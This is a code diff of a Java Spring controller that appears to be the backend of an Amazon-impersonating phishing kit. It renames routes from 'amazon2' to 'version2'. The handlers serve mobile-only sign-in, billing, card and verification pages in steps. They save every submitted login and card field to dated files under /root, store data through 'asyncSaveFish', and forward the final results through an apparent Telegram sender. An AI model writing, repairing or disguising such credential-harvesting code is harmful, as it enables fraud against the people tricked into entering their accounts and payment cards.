@@ -43,7 +43,7 @@ public class Amazon2MobileController {
     @Autowired
     private HttpServletResponse response;
 
-    @GetMapping("/amazon2/mobile/signin")
+    @GetMapping("/version2/mobile/signin")
     public Object signin(@RequestHeader("User-Agent") String uaStr) {
         String ip = IpUtils.getIpAddress(request);
         String path = "/root/countClickLink2.txt";
@@ -58,26 +58,26 @@ public class Amazon2MobileController {
         Boolean isMobile = false;
         UserAgent ua = UserAgentUtil.parse(uaStr);
         isMobile = ua.isMobile();
-        if (isMobile) return "amazon2/mobile/index";
+        if (isMobile) return "version2/mobile/index";
         else return "redirect:/signin";
     }
 
     @GetMapping("/")
     public Object signin2(@RequestHeader("User-Agent") String uaStr) {
-        return "redirect:/amazon2/mobile/signin";
+        return "redirect:/version2/mobile/signin";
     }
 
-    @GetMapping("/amazon2/mobile/homepage/billing")
+    @GetMapping("/version2/mobile/homepage/billing")
     public Object update_billing() {
-        return "amazon2/mobile/billing";
+        return "version2/mobile/billing";
     }
 
-    @GetMapping("/amazon2/mobile/homepage/card")
+    @GetMapping("/version2/mobile/homepage/card")
     public Object card() {
-        return "amazon2/mobile/card";
+        return "version2/mobile/card";
     }
 
-    @GetMapping("/amazon2/mobile/homepage/secure")
+    @GetMapping("/version2/mobile/homepage/secure")
     public Object secure(Model model) {
         HttpSession session = request.getSession();
         Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
@@ -90,14 +90,14 @@ public class Amazon2MobileController {
         model.addAttribute("cardName", namecard);
         model.addAttribute("cardNo",cardNumber.substring(cardNumber.length() - 4, cardNumber.length()));
         model.addAttribute("image",cardType.getImageName());
-        return "amazon2/mobile/secure2";
+        return "version2/mobile/secure2";
     }
 
-    @GetMapping("/amazon2/mobile/homepage/success")
+    @GetMapping("/version2/mobile/homepage/success")
     public Object success() {
         //TODO 不
         addCookie("kiddIp", IpUtils.getIpAddress(request));
-        return "amazon2/mobile/success";
+        return "version2/mobile/success";
     }
 
     public void addCookie(String key, String value) {
@@ -108,7 +108,7 @@ public class Amazon2MobileController {
     }
 
 
-    @PostMapping("/amazon2/mobile/signin")
+    @PostMapping("/version2/mobile/signin")
     @ResponseBody
     public Object signinPost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -119,11 +119,11 @@ public class Amazon2MobileController {
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
-        asyncTask.asyncWriteMap(String.format("/root/amazon2-step1/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncWriteMap(String.format("/root/version2-step1/%s.txt", timeStr), userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
     }
 
-    @PostMapping("/amazon2/mobile/homepage/billing")
+    @PostMapping("/version2/mobile/homepage/billing")
     @ResponseBody
     public Object billingPost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -139,11 +139,11 @@ public class Amazon2MobileController {
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
-        asyncTask.asyncWriteMap(String.format("/root/amazon2-step2/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncWriteMap(String.format("/root/version2-step2/%s.txt", timeStr), userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
     }
 
-    @PostMapping("/amazon2/mobile/homepage/card")
+    @PostMapping("/version2/mobile/homepage/card")
     @ResponseBody
     public Object cardPost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -160,12 +160,12 @@ public class Amazon2MobileController {
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
-        asyncTask.asyncWriteMap(String.format("/root/amazon2-step3/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncWriteMap(String.format("/root/version2-step3/%s.txt", timeStr), userInfoMap);
         asyncTask.asyncSaveFish("/root/lack"+timeStr+"/",userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
     }
 
-    @PostMapping("/amazon2/mobile/homepage/secure")
+    @PostMapping("/version2/mobile/homepage/secure")
     @ResponseBody
     public Object securePost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -178,7 +178,7 @@ public class Amazon2MobileController {
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
-        asyncTask.asyncWriteMap(String.format("/root/amazon2-step4/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncWriteMap(String.format("/root/version2-step4/%s.txt", timeStr), userInfoMap);
         asyncTask.asyncSendTgMsg(null,null,userInfoMap);
         asyncTask.asyncSaveFish("/root/full"+timeStr+"/",userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
